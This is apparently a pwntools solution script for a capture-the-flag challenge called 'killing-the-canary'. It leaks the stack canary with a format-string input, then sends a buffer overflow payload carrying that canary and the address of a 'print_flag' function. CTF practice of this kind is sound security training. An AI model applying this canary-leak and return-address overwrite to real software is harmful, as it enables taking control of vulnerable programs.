#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$ld") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)

m_hex = re.search(br'0x([0-9a-fA-F]+)', val)
if m_hex:
    canary = int(m_hex.group(1), 16)
else:
    canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])

log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']
# log.info(hex(win))

payload = b'AAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBB'
payload += p64(canary)
payload += p64(win)
payload += p64(win)

r.sendline(payload)

r.recvline()
r.interactive()